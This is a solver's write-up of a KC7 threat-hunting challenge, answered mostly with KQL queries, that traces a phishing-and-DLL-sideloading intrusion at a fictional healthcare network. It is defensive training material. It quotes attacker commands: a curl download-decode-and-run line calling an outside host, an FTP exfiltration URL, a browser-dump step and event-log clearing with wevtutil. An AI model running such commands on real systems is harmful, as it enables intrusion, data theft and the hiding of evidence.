@@ -1,0 +1,238 @@
+SUMMARY
+Your expertise is urgently needed for a critical task. The Square has recently uncovered a sophisticated malware sample targeting U.S. service members. This malware is being distributed through phishing emails disguised as communications from healthcare providers.
+Our intelligence has indicated that Empire Health's network is the next probable target. As a representative of KCHQ, you are tasked with identifying and neutralizing this phishing attempt, as well as uncovering the perpetrators.
+Empire Health is one of the largest healthcare networks in the country and healthcare is routinely targeted in cyber-space. The Square has specifically asked for your support for this urgent task.
+
+SOURCE
+https://kc7cyber.com/challenges/909
+
+STEPS TAKEN
+How many distinct employees have "IT" in their role?
+Employees
+| where role contains "IT "
+Answer: 75
+
+How many distinct email senders were not affiliated with the 'empirehealth.ny' domain?
+Email
+| where sender !contains "empirehealth.ny"
+| distinct sender
+Answer: 12088
+
+Let's start with looking at email links containing the phrase "servicemembers". How many results are there?
+Email
+| where link contains "servicemembers"
+Answer: 0
+
+Look at the word "military" in the links but only senders that are not from the empirehealth.ny domain. How many distinct senders meet this criteria?
+Email
+| where link contains "military"
+| where sender !contains "empirehealth.ny"
+| distinct sender
+Answer: 17
+
+Maybe try looking at some of the links in that last query that contain the word "healthcare" from senders outside the organization. How many distinct recipients do we get from that?
+Email
+| where link contains "healthcare"
+| where sender !contains "empirehealth.ny"
+| distinct recipient
+Answer: 6
+
+How many distinct links are there from non-EmpireHealth senders that contain the word "healthcare"?
+Email
+| where link contains "healthcare"
+| where sender !contains "empirehealth.ny"
+| distinct link
+Answer: 4
+
+Awesome, and what about distinct file names? How many are there?
+Email
+| where link contains "healthcare"
+| extend pathname = tostring(parse_url(link).Path)
+| extend filename = tostring(parse_path(pathname).Filename)
+| where sender !contains "empirehealth.ny"
+| distinct filename
+Answer: 3
+
+What file extension are these files?
+Answer: zip
+
+Now that we have a great suspicious start, let's dive into one of these- how about eddie_mcfed@empirehealth.ny? We saw him in the list of recipients in Question 8. What is this user's role?
+Employees
+| where email_addr == "eddie_mcfed@empirehealth.ny"
+| project role
+Answer: Federal Programs Coordinator
+
+What's his IP address?
+Employees
+| where email_addr == "eddie_mcfed@empirehealth.ny"
+| project ip_addr
+Answer: 10.10.0.29
+
+Back to those zip files that we saw, one of which was associated with Eddie's email address. Can we figure out if he clicked the link? What time did he click it? (If he did not click it, type 'no')
+OutboundNetworkEvents
+| where src_ip == "10.10.0.29"
+| where url contains "zip"
+Answer: 2024-03-18T12:44:34.000Z
+
+Let's look at FileCreationEvents to see if the zip file was successfully downloaded on his computer. What is the timestamp of the creation event?
+let host=
+Employees
+| where ip_addr == "10.10.0.29"
+| distinct hostname;
+FileCreationEvents
+| where hostname in (host)
+| where filename == "Veterans_Medical_Services.zip"
+Answer: 2024-03-18T12:45:16.000Z
+
+Can you confirm the file hash as well?
+Answer: d17275ae115eda1e0625ca041fc55a634c054f21cd81693ea2bf81580760bb3f
+
+Let's see what was created right after this file? What was this file name?
+let host=
+Employees
+| where ip_addr == "10.10.0.29"
+| distinct hostname;
+FileCreationEvents
+| where hostname in (host)
+| where timestamp > datetime(2024-03-18T12:45:16.000Z)
+Answer: benefit_information_veteran_affairs.pdf.lnk
+
+What is a .lnk file?
+Answer: shortcut
+
+Let's pay particular attention to the Documents folder in the next few events. What's going on in the /Documents/ folder? What file is seen first from the /Documents/ folder?
+Answer: 1.bat
+
+What does that file extension stand for from the previous question?
+Answer: batch file
+
+Look right after the bat file, too. There's a couple more files created. MsMpEng is the Microsoft Malware Protection Engine, but if you look at the file path I don't think that's where it's supposed to be. Let's look at ProcessEvents around the same time of the FileCreationEvent you gave the timestamp in Question 15. Give the full "curl" command that is run not long after that timestamp you found.
+let host=
+Employees
+| where ip_addr == "10.10.0.29"
+| distinct hostname;
+ProcessEvents
+| where hostname in (host)
+| where timestamp > datetime(2024-03-18T12:45:16.000Z)
+Answer: curl https://data.algoadvertise.com/data/usershares/rsergey/1.txt -o C:\Users\Public\Documents\1.bat && certutil -decode C:\Users\Public\Documents\1.bat C:\Users\Public\Documents\2.bat && start C:\Users\Public\Documents\2.bat
+
+What is the name of the text file being downloaded in the curl command?
+Answer: 1.txt
+
+Where is that file being saved? (After the "-o", Provide the full file path)
+Answer: C:\Users\Public\Documents\1.bat
+
+What is the name of command the -decode flag is being used with
+Answer: certutil
+
+What is the name of the .bat file being created with that command?
+Answer: 2.bat
+
+What domain does this command have in it? (include the .com in your answer)
+Answer: algoadvertise.com
+
+Who appears to be the user linked in that url you found?
+Answer: rsergey
+
+What year was AlgoAdvertise LLC founded?
+Answer: 2021
+
+
+Section 2: More Intel
+So a couple things happen in this sequence of events, but it looks like a very normal Windows program gets run. What is the name of this executable?
+Answer: MsMpEng.exe
+
+What is the name of the Windows Application?
+Answer: Microsoft Malware Protection Engine
+
+What is the full path of the file on this system?
+Answer: C:\Users\Public\Documents\MsMpEng.exe
+
+There's another file in the same folder on this system. You might need to look at another command line nearby. What is the name of that file?
+Answer: MpSvc.dll
+
+What is this attack called?
+Answer: DLL Sideloading
+
+How many processes is MsMpEng.exe creating on edmcfed's system?
+let host=
+Employees
+| where ip_addr == "10.10.0.29"
+| distinct hostname;
+ProcessEvents
+| where hostname in (host)
+| where timestamp > datetime(2024-03-18T12:45:16.000Z)
+| where parent_process_name == "MsMpEng.exe"
+Answer: 0
+
+How many total processes did MsMpEng.exe across the entire network?
+ProcessEvents
+| where parent_process_name == "MsMpEng.exe"
+Answer: 7
+
+Who's the username associated with these events?
+Answer: dascully
+
+What's their role in the company?
+let user=
+ProcessEvents
+| where parent_process_name == "MsMpEng.exe"
+| distinct username;
+Employees
+| where username in (user)
+| project role
+Answer: Director of Military Health Services
+
+What is the destination URL from the command run at timestamp 2024-04-02T12:12:44Z?
+ProcessEvents
+| where timestamp == datetime(2024-04-02T12:12:44Z)
+Answer: ftp://algoadvertise.com/incoming/empirehealth_dump/
+
+Looks like we found the compromised host. Just to make sure, let's look to see if she downloaded the suspicious .zip file just like our friend Eddie did. Did Dana get the email just like Eddie did? At what time?
+let comp_host=
+ProcessEvents
+| where timestamp == datetime(2024-04-02T12:12:44Z)
+| where process_commandline contains "ftp://algoadvertise.com/incoming/empirehealth_dump/"
+| distinct hostname;
+let comp_ip=
+Employees
+| where hostname in (comp_host)
+| distinct email_addr;
+Email
+| where recipient  in (comp_ip)
+| where link contains ".zip"
+Answer: 2024-03-18T11:45:34.000Z
+
+When did the first process run by MsMpEng.exe occur on Dana's machine?
+let comp_host=
+ProcessEvents
+| where timestamp == datetime(2024-04-02T12:12:44Z)
+| where process_commandline contains "ftp://algoadvertise.com/incoming/empirehealth_dump/"
+| distinct hostname;
+ProcessEvents
+| where parent_process_name == "MsMpEng.exe"
+Answer: 2024-04-02T10:46:19.000Z
+
+When did the last process run by MsMpEng.exe occur?
+Answer: 2024-04-02T13:32:44.000Z
+
+One command run by MsMpEng mentions patient records. What is the network share path mentioned in this command?
+Answer: \\recordssrv01\confidential\service_members\patient_records_2024\
+
+MsMpEng is connecting to algoadvertise.com and downloading what looks like a browser dumping tool. What file path is this tool saved to?
+Answer: C:\Users\Public\Documents\dmp.exe
+
+A few minutes after downloading the browser dumping tool, the attackers use it to target a specific site. What is the domain targeted by the browser dumping tool?
+Answer: ehr.empirehealth.ny
+
+What does EHR stand for here?
+Answer: Electronic Health Records
+
+What is the file path where the attacker saved the browser dump to?
+Answer: C:\Users\Public\Documents\browser_dump.txt
+
+A few moments later, the attacker exfiltrates data using the PowerShell command Start-BitsTransfer. What URL does this command connect to?
+Answer: ftp://algoadvertise.com/incoming/empirehealth_dump/
+
+Before leaving, the attacker clears the windows event logs to hide what they've done. What command do they use to do this?
+Answer: wevtutil cl Security && wevtutil cl System && wevtutil cl Application
